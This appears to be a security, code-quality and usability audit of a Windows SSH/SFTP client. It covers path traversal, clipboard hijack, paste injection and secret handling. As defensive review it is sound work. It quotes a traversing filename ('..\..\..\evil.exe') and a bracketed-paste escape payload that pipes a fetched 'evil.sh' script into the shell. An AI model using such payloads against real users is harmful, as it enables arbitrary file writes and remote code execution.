# AmberSSH audit

Three passes over the tree at commit `ecc2488`, branch `amberx-phase0`.
Only S1 has been fixed since, at the user's direction; everything else stands
as written. Every claim below cites the code it came from; where I
could not establish something by reading, it says **unverified** instead of
guessing.

## Corrections to the brief

Three numbers in the brief do not match the tree, and one component does not
exist. Stating them up front because they change what "how much is
copy-paste" means.

| Brief said | Actually |
|---|---|
| Three.js web version | No web version. No `package.json`, no `.ts`/`.tsx`/`.jsx` anywhere outside `vcpkg_installed`. |
| 8 skins | 15 — `ChromeStyle::Count`, `src/ui/Chrome.h:106` |
| 17 motion styles | 23 — `kMotionStyles[]`, `src/render/motion_styles.h:54` |
| 24 settings pages | 29 distinct `Page::` values in `src/ui/ConnectionDialog.cpp` |

Because there is no web version, the whole web sub-section of Pass 1 (XSS in
terminal output rendering, `npm audit`, secrets in the bundle, CSP) has no
subject. It is not "clean"; it is absent.

---

# PASS 1 — SECURITY

## S1. SFTP download writes wherever the remote server says — CRITICAL — FIXED

> **Fixed** in the commit that follows this audit. `src/ssh/RemoteName.{h,cpp}`
> is a pure gate: `CheckRemoteName` refuses any server-supplied component that
> is not one plain filename, `CheckRemotePath` applies that per component to a
> relative path, and `PathWithin` is a lexical containment check applied to
> every finished path as a second line. Symlinked directories are no longer
> descended by the recursive walk. Covered by `tests/RemoteNameTests.cpp`
> (83 assertions).
>
> **Two sites below were missed by this audit and found while fixing it:**
> the sync planner at `src/ui/SftpBrowser.cpp:2642`, which concatenated a
> whole remote-relative path onto the local directory and is the same bug with
> a wider payload, and `src/ui/SftpPanel.cpp:432`, which pre-filled a Save
> dialog with the remote name. Both are now gated. The original audit found
> five sites; there were seven.

The description below is of the code as it stood.


`src/ui/SftpBrowser.cpp:1296` (and `:1283` in the recursive case)

```cpp
x->local = LocalJoin(localDir, Widen(e.name));
```

`e.name` is the filename as returned by the server. It arrives at
`src/ssh/SftpClient.cpp:236-238`, where the only filter is exact equality:

```cpp
std::string nm(name, static_cast<size_t>(n));
if (nm == "." || nm == "..")
    continue;
```

and `LocalJoin` (`src/ui/SftpBrowser.cpp:88-92`) is pure concatenation with a
backslash. Nothing between the socket and `CreateFile` rejects a separator, a
relative segment, a drive letter or a colon.

A server that returns a directory entry named `..\..\..\evil.exe` writes
outside the directory the user chose. On Windows the reachable targets from a
user-writable download folder include the per-user Startup folder, which turns
an arbitrary file write into code execution at next logon. Also unfiltered:
`:` (creates an alternate data stream), the reserved device names (`CON`,
`NUL`, `COM1`…), and trailing dots and spaces.

The recursive case is worse. `QueueDownload` at `src/ui/SftpBrowser.cpp:1271-1285`
walks server-supplied subdirectories (`:1280`):

```cpp
if (k.dir) { walk(SftpJoin(rdir, k.name), LocalJoin(ld, Widen(k.name))); continue; }
```

and `k.dir` is set true for a **symlink** that stats as a directory
(`src/ssh/SftpClient.cpp:245-251`). A symlink pointing at `/` gives an
unbounded walk; a symlink chain combined with a traversing name gives the
write primitive above at every level.

**Why CRITICAL:** the attacker input is a filename, the sink is a local file
write, there is no validation in between, and the user action required
(downloading a directory) is the ordinary use of the feature. Severity does
not depend on the user doing anything unusual.

**Unverified:** I did not stand up a hostile SFTP server, so I have not
demonstrated the write end to end. The absence of any sanitising step is
established by reading; exploitability is inferred from it.

## S2. The asciinema recorder is the one output sink that does not mask — HIGH

`src/app.cpp:1310-1325`, one function, two sinks:

```cpp
LogFiltered(s.logFile, d, n, s.logEscState,
            m_cloak.enabled ? &m_cloak : nullptr,
            m_cloak.enabled ? &s.logMaskBuf : nullptr);
...
if (s.castFile)
    RecordCast(s, d, n);
```

The session log gets the Privacy Cloak. `RecordCast`
(`src/app.cpp:10643-10670`) receives the same bytes and JSON-escapes them,
nothing more. The command journal masks unconditionally —
`MaskForStorage` at `src/app.cpp:1183-1188` forces `o.enabled = true`
regardless of the screen setting, and is applied at both journal write sites
(`src/app.cpp:9682-9683` and `:11246-11247`).

So two of the three persistent sinks mask and one does not, and the one that
does not captures the full server output stream verbatim: anything the remote
shell echoes back, including `export TOKEN=…` as typed, the contents of any
file the user cats, and any credential a server prints.

**Why HIGH:** the user has a masking control, has turned it on, and reasonably
believes it covers recording. A `.cast` file is made specifically to be
shared. The gap is silent.

## S3. A remote server can silently replace the local clipboard — HIGH

`src/term/vtparser.cpp:504-514`:

```cpp
if (m_oscBuf.rfind("52;", 0) == 0)
{
    size_t semi = m_oscBuf.find(';', 3);
    if (semi != std::string::npos && m_clip)
    {
        std::string b64 = m_oscBuf.substr(semi + 1);
        if (b64 != "?")
            m_clip(b64);
    }
}
```

The `?` query is dropped, so a server cannot **read** the clipboard. That half
is right. The write half is unconditional — `src/app.cpp:11872-11880` decodes
the base64 and calls `SetClipboardText` with no setting consulted and no
prompt. The only feedback is a transient status line, printed after the
clipboard has already changed.

Compare the neighbouring capability. Remote **title** changes are gated by a
per-profile setting with a checkbox: `allowRemoteTitle`
(`src/profiles/ConnectionProfile.h:159`, honoured at
`src/term/vtparser.cpp:400`, exposed at `src/ui/ConnectionDialog.cpp:1032`).
The lower-impact capability has a switch; the higher-impact one does not.

**Why HIGH:** the clipboard is process-wide. The victim pastes into a browser,
a password field, a different terminal. This is the standard clipboard-hijack
primitive and most terminals gate it.

## S4. Pasted text is wrapped in bracketed-paste markers without sanitising it — HIGH

`src/app.cpp:5459-5462`:

```cpp
if (Cur().parser.Modes().bracketedPaste)
    SendToShell("\x1b[200~" + norm + "\x1b[201~");
```

`norm` comes from the normalisation loop at `src/app.cpp:5375-5398`, which
handles CRLF→CR, LF→CR and strips U+FE0E/U+FE0F. `ESC` is not touched. An
embedded `\x1b[201~` in the clipboard therefore closes the bracket early and
everything after it is delivered to the shell as ordinary typed input.

The guard does not catch this. `PasteNeedsConfirm`
(`src/utility/PasteGuard.h:24-29`) fires only on a `\r` or on more than 2000
characters:

```cpp
return norm.find('\r') != std::string::npos ||
       norm.size() > kPasteConfirmChars;
```

A payload of `\x1b[201~curl evil.sh|sh` — no carriage return, well under the
limit — produces no preview at all, and lands on the shell's command line
ready for the user's own Enter.

The header comment says bracketed paste is "deliberately not consulted"
because shells that lack it still execute on Enter. That reasoning is sound
for deciding *when to confirm*. It does not cover sanitising the payload,
which is a separate control that is simply absent.

**Why HIGH:** clipboard contents are frequently attacker-influenced (a copied
command from a web page is the canonical case), and the guard that exists is
the thing the user is trusting.

## S5. No hardened algorithm baseline, and a rejected preference fails open — MEDIUM

`src/ssh/session.cpp:1139-1147`:

```cpp
// Algorithm preferences (comma lists, PuTTY-style). A list libssh2
// cannot honour leaves its default order in place.
if (!cfg.cipherPref.empty())
{
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_CS, cfg.cipherPref.c_str());
    libssh2_session_method_pref(session, LIBSSH2_METHOD_CRYPT_SC, cfg.cipherPref.c_str());
}
if (!cfg.kexPref.empty())
    libssh2_session_method_pref(session, LIBSSH2_METHOD_KEX, cfg.kexPref.c_str());
```

Three problems, in order of how much they matter:

1. `cipherPref`, `kexPref` and `hostKeyPref` all default to empty
   (`src/profiles/ConnectionProfile.h:260-262`), so out of the box the
   negotiation is whatever order libssh2 ships. The application never
   establishes a floor of its own.
2. The return value of every `libssh2_session_method_pref` call is discarded
   (`:1143`, `:1144`, `:1147`, `:1175`, `:1181`). A user who types a hardened
   cipher list that libssh2 does not recognise gets the default order and no
   indication. The comment shows this is known. A security control that
   silently reverts to a weaker setting is worse than not offering it.
3. `LIBSSH2_METHOD_MAC_CS` and `LIBSSH2_METHOD_MAC_SC` are never set anywhere
   in `src/`, and there is no UI for MAC selection. Integrity algorithm choice
   is entirely libssh2's default.

**Why MEDIUM not HIGH:** libssh2 1.11's defaults are not catastrophic, and
exploiting a weak negotiated algorithm needs an active network position. It is
MEDIUM because the failure mode is silent and the control that looks like it
protects you does not.

## S6. Dependencies are unpinned — MEDIUM

`vcpkg.json` in full:

```json
"dependencies": [ "libssh2", "openssl", "nlohmann-json", "catch2", "directx-dxc" ]
```

No `builtin-baseline`, no `version>=` constraints, no
`vcpkg-configuration.json`. What is installed right now is libssh2 `1.11.1#3`
and OpenSSL `3.6.3` (from `vcpkg_installed/*/vcpkg.spdx.json`), both current.
That is a property of this machine's registry checkout on this date, not of
the repository. Another machine, or this one after a registry update, resolves
differently with nothing recording the change.

**Why MEDIUM:** for an application whose whole job is transport security, "we
do not know which crypto library a build contains" is a real defect, but it is
a process failure rather than a live vulnerability.

## S7. `SecureString::Assign` leaves the tail of the previous secret — MEDIUM

`src/utility/SecureString.cpp:63-72`:

```cpp
void SecureString::Assign(std::string_view text)
{
    if (text.empty()) { Clear(); return; }
    if (m_capacity < text.size() + 1)
        Allocate(text.size());
    std::copy(text.begin(), text.end(), m_data);
    m_data[text.size()] = '\0';
    m_size = text.size();
}
```

When the existing buffer is large enough the reallocation is skipped, and the
bytes from `text.size() + 1` to `m_capacity` keep whatever was there. Assign a
short passphrase over a longer password and the tail of the password stays in
the heap block until the object is destroyed. `m_size` hides it from every
accessor; a memory dump does not care.

The class exists specifically to bound the window in which a secret is
recoverable from process memory, and this is the one path that widens it.

**Why MEDIUM:** it needs local memory access to exploit, which is already a
bad day. But this is the mitigation's own failure, in the mitigation's own
code.

## S8. Four call sites materialise secrets and never scrub them — MEDIUM

`Reveal()` is documented at `src/utility/SecureString.h:35-37` as handing
responsibility to the caller. Some callers take it:

- `src/app.cpp:1601-1603`, `:11199-11208` — `ScrubString` on all three
- `src/app_vnc.cpp:157`, `:168` — scrubbed

Four do not:

- `src/app.cpp:10263-10264` — `m_vitals.Start(..., savedPassword.Reveal(), savedPassphrase.Reveal())`
- `src/ui/ConnectionDialog.cpp:1998`, `:2004`, `:2010` — `Widen(pw.Reveal())`, which produces an unscrubbed `std::string` **and** an unscrubbed `std::wstring`, then pushes the plaintext into a Win32 `EDIT` control that has its own buffer nobody zeroes
- `src/ui/SftpBrowser.cpp:2253`, `:2269` — `AddTab(profile, password.Reveal(), passphrase.Reveal(), …)`
- `src/ui/SftpPanel.cpp:489` — `worker.Start(profile, password.Reveal(), passphrase.Reveal())`

**Why MEDIUM:** same reasoning as S7. Noted separately because the fix is
different — S7 is one function, this is a discipline that is applied on some
paths and not others, which is how it will regress again.

## Checked and found sound

Stated as findings of fact because the brief asked for the problems and these
are places the problems are not.

- **Host key verification is enforced.** `src/ssh/session.cpp:1244-1327`.
  `LIBSSH2_KNOWNHOST_CHECK_MISMATCH` calls `fail()` and returns — there is no
  click-through. An unknown host posts `HostKeyPrompt` and blocks on a
  condition variable until the user answers; rejection fails the connection.
  Manually configured fingerprints (`:1252-1279`) act as an exclusive trust
  store that refuses anything unlisted. `known_hosts` is read *before* the
  handshake (`:1167-1170`) so the host-key algorithm is negotiated to match
  what is already trusted.
- **No unsafe C string functions.** `strcpy`, `strcat`, `sprintf`, `gets`,
  `strncpy` and `alloca` do not appear anywhere in `src/`.
- **RFB decoding is bounds-checked.** Every decoder gates on
  `Within(rect, fb)` (`src/vnc/RfbDecoders.cpp:29-34`, backed by `RectWithin`,
  documented at `src/vnc/RfbProtocol.h:221-222` as rejecting 16-bit wrap).
  Hextile tiles derive from a validated rect and subrects are re-checked
  against the tile at `:456-457`. Framebuffer size is capped at
  `src/vnc/RfbProtocol.h:29-30`. A malformed frame returns `Decode::Bad` →
  `Parse::Bad` (`src/vnc/RfbClient.cpp:730-731`) → `Feed` false →
  connection closed (`src/vnc/VncSession.cpp:568-573`).
- **OSC 52 read is refused** — `src/term/vtparser.cpp:511`. Only the write
  direction is the problem (S3).
- **The command journal masks before persisting** — `src/app.cpp:9682-9683`,
  `:11246-11247`, via `MaskForStorage` (`:1183-1188`) which forces masking on
  regardless of the screen cloak setting.
- **VNC TLS `SSL_VERIFY_NONE` is deliberate and the result is enforced.**
  `src/vnc/RfbTls.cpp:171` disables handshake-time enforcement so the
  fingerprint can be shown; `src/vnc/VncSession.cpp:670-708` then accepts only
  on `Verify::Trusted`, on an exact pin match, or on explicit user consent,
  and sets `m_tlsFatal` on refusal. `SSL_set1_host` (`RfbTls.cpp:186`) means
  hostname checking is part of the verify result.
- **The SSH-to-render ring does not drop bytes.** `src/ssh/ring.h` documents
  "drops on overflow", but the only producer loops until everything is written
  (`src/ssh/session.cpp:1823-1830`), applying backpressure instead.

---

# PASS 2 — CODE QUALITY

## Q1. `src/app.cpp` is 14,583 lines — HIGH

It holds the window procedure, the render loop, menu construction, settings
load and save, the session model, VNC glue, the journal, the palette, paste
handling, the recorder and the demo modes. Every finding in Pass 1 that is not
in a parser is in this file or reachable only through it.

Concretely: S2 exists because two sinks that should share a policy are two
statements 14 lines apart in one function; S3 exists because the clipboard
sink is a lambda at `:11872` with no policy layer to consult; S8 exists
because there is no boundary at which "a secret is being materialised" could
be enforced.

The renderer, the network layer and the terminal parser are all cleanly
separated into their own directories. The problem is the layer above them.

## Q2. The files carrying the security findings have no tests — HIGH

33 test files exist. `tests/` covers the parsers and pure logic well:
`AnsiParserTests`, `VncProtocolTests`, `VncClientTests` (with a
`FakeRfbServer.h`), `SyncPlanTests`, `PasteGuardTests`, `PrivacyCloakTests`,
`SecureStringTests`, `GuardianTests`, plus an AmberX fuzz corpus.

There is no test file for:

| Component | Findings it carries |
|---|---|
| `src/ssh/SftpClient.cpp` | S1 |
| `src/ui/SftpBrowser.cpp` | S1 |
| `src/ssh/session.cpp` | S5, and the host-key logic |
| `src/platform/CredentialStore.cpp` | secret storage |
| `src/app.cpp` | S2, S3, S4, S8 |

The top five untested risky paths, in order:

1. **Remote filename → local path construction.** Pure, trivially testable,
   and currently the CRITICAL finding.
2. **Host key decision.** The one control standing between the user and a
   man-in-the-middle. `PasteGuardTests` demonstrates the pattern that would
   work here: lift the decision into a pure function and test the matrix of
   (known_hosts state × manual list × arriving key).
3. **Secret lifetime.** `SecureStringTests` exists but did not catch S7 —
   assign-shorter-over-longer then inspect the buffer past `Size()`.
4. **Which sinks mask.** A test asserting that every persistent sink runs
   input through the cloak would have caught S2 and would catch the next one.
5. **Escape sequences surviving a paste.** `PasteGuardTests` tests the
   confirm predicate but not the payload transformation, which is where S4 is.

## Q3. Layering violations

- `src/ui/ConnectionDialog.cpp:1998-2010` moves plaintext secrets into Win32
  controls directly. A UI file is the wrong place for secret lifetime to be
  decided, and it is decided there by omission.
- `src/ui/SftpBrowser.cpp` contains the transfer engine, the path
  construction, the worker threading and the Win32 list views in one
  2,588-line file. S1 lives at the seam.
- `src/security/PrivacyCloak.h:15-17` states the cloak is "a presentation
  decision applied at draw time, exactly like every other overlay". That is a
  deliberate architectural choice and it is the reason S2 is possible: any
  consumer reading the byte stream rather than the drawn output bypasses it by
  construction. Sinks that persist are not presentation, and the architecture
  does not distinguish them.

## Q4. Duplication — smaller than the brief assumes

The brief's premise was that 8 skins, 17 motion styles and 24 settings pages
are largely copy-paste. Reading them, the counts are 15, 23 and 29, and they
are mostly data-driven already:

- Motion styles are one table — `kMotionStyles[]` in
  `src/render/motion_styles.h`, one row per style, with `kMotionStyleCount`
  derived by `sizeof`.
- Skins are a `ChromeSpec` table with feature flags; the per-skin drawing
  lives in shared helpers in `src/ui/SkinDraw.h`.
- Settings pages are built from a field table — `choice(...)`, `chk(...)`
  calls taking a `Page` and a member pointer (`ConnectionDialog.cpp:1032`,
  `:1387`).

I did not find a large copy-paste surface in these three. `src/app.cpp` (Q1)
is the volume problem, and it is not repetition — it is one file doing many
unrelated jobs.

## Q5. Error handling

- `libssh2_session_method_pref` returns are discarded in five places (S5).
- `libssh2_knownhost_readfile` and `libssh2_knownhost_writefile` returns are
  discarded (`src/ssh/session.cpp:1169`, `:1326`). A `known_hosts` that fails
  to write means the next connection re-prompts rather than failing open, so
  the direction is safe, but the user is never told the file could not be
  written.
- `src/ssh/session.cpp:793` and `src/ssh/transports.cpp:167` return a bare
  failure with no error text on `getaddrinfo` failure. The main SSH connect
  path does produce a message (`transports.cpp:588`).

**Unverified:** I did not audit D3D12 descriptor or resource lifetimes, GPU
synchronisation, or the AmberX subsystem (`src/amberx/`, 3,257 lines). Those
were out of the time this pass had and are not covered by any claim here.

---

# PASS 3 — USABILITY

Everything in this pass is from reading strings and defaults. I did not run
the application, so nothing here is an observation of the running product.

## U1. Failure messages are actionable

- **Host key mismatch** (`src/ssh/session.cpp:1290-1299`) names both the
  stored key type and the offered one, explains that a same-type mismatch is
  the alarming case, and gives the literal `ssh-keygen -R <host>` command.
- **DNS** (`src/ssh/transports.cpp:588`) — `could not resolve host "x"`.
- **Wrong password** (`src/ssh/session.cpp:1405`) — `authentication failed
  (check user/password)`.
- **Key auth** (`:1386`) prefixes the libssh2 error.

## U2. Reduced motion follows the OS

`src/app.cpp:7775-7780` seeds `reducedMotion` from
`SPI_GETCLIENTAREAANIMATION`, so a user who has turned animations off in
Windows gets a calm application without finding a setting. It is also
togglable at `:6980` and persisted. This is the correct behaviour for the
motion-sensitivity question in the brief.

## U3. 29 settings pages

Connection, Session, Logging, Terminal, Keyboard, Bell, Features, Window,
Appearance, Behaviour, Translation, Selection, Colours, Data, Proxy, Telnet,
Rlogin, Ssh, SshAuth, SshHostKeys, SshTunnels, SshX, Serial, Local, Vnc,
Effects, Guardian, Reattach, RemoteGui.

The structure is inherited from PuTTY, which is defensible for the protocol
pages. The ones that look like defaults rather than settings, from reading
their fields:

- `Page::Effects` — particle effect toggles. Every one already defaults off
  (`ConnectionProfile.h`, `vncFxPrism/Tails/Trails/Ignite = false`).
- `Page::Reattach`, `Page::Guardian` — reconnect policy, which has a sensible
  default and is a per-incident decision.

**Unverified:** which settings are undiscoverable is a question about the
running UI. I can say there are 29 pages; I cannot say what a user finds.

## U4. Accessibility — mostly unverified

- **Motion:** covered, U2.
- **Contrast:** the amber-on-dark palettes are in `src/term/palette.h` and
  `src/ui/Theme.h`. I did not compute contrast ratios against WCAG
  thresholds. **Unverified.**
- **Keyboard-only navigation:** the dialogs are Win32 with owner-drawn
  controls (`src/ui/ConnectionDialog.cpp:118` mentions `BS_OWNERDRAW`).
  Owner-drawn controls commonly lose focus rectangles and keyboard
  affordances, but whether these do is a runtime question. **Unverified.**
- **Screen readers:** the terminal grid is drawn as GPU particles with no
  text layer. There is no UI Automation provider anywhere in `src/`. A screen
  reader will find nothing to read in the terminal area. Stated from absence
  of code, not from testing. **Unverified in effect, established in cause.**

## U5. First-run and readability — unverified

Both questions in the brief — how many steps from launch to a live session,
and whether particle rendering is ever worse than plain text for long output —
require running the application. I have not.

---

# Top 10, ordered by severity × likelihood of getting burned

1. **S1 — SFTP path traversal. FIXED.** Was the only CRITICAL on the list: a
   file write outside the chosen directory, driven by a filename, in a feature
   whose normal use triggers it. Gated at all seven sites by
   `src/ssh/RemoteName.{h,cpp}`, and symlinked directories are no longer
   descended.
2. **S3 — unconditional OSC 52 clipboard writes.** Cheapest fix on the list:
   the gate already exists for titles, one profile field away.
3. **S4 — unsanitised paste payload.** Strip `\x1b[201~` (and bare ESC) from
   `norm` before wrapping. The guard cannot be the only control because it
   does not fire on the payload that matters.
4. **S2 — unmasked `.cast` recordings.** One argument to add at
   `src/app.cpp:1325`, and a test that enumerates persistent sinks so the next
   one cannot forget.
5. **Q2 — no tests on `SftpClient`, `session`, `CredentialStore`.** Ranked
   this high because it is why 1 through 4 are all still here, and it is what
   stops number 11 from arriving.
6. **S5 — silent algorithm-preference fallback.** Check the return, tell the
   user, and set a floor rather than inheriting libssh2's order.
7. **S8 — unscrubbed `Reveal()` sites.** Four known; the pattern will recur
   until `Reveal()` returns something self-scrubbing.
8. **S7 — `SecureString::Assign` tail.** Three lines. Fix with 5 and 7.
9. **S6 — unpinned dependencies.** Add `builtin-baseline`. No user-visible
   effect until the day it has a large one.
10. **Q1 — `app.cpp` at 14,583 lines.** Last because it is the most expensive
    and the least urgent, and first because everything above it is a symptom.

# What could not be verified without running the app

- Exploitability of S1 end to end (needs a hostile SFTP server; the absence of
  sanitising is established by reading, the write is not demonstrated).
- Contrast ratios on any skin.
- Keyboard-only navigation through the owner-drawn dialogs.
- Screen reader behaviour — the *cause* is established (no UI Automation
  provider exists in `src/`), the effect is not measured.
- First-run step count.
- Whether particle rendering degrades readability on long output.
- D3D12 resource and descriptor lifetimes, GPU synchronisation.
- The AmberX subsystem (`src/amberx/`, 3,257 lines) — not audited at all.
- Runtime thread interleaving. The SPSC ring is correct by inspection
  (`src/ssh/ring.h`, acquire/release pairs) but I ran no sanitiser.
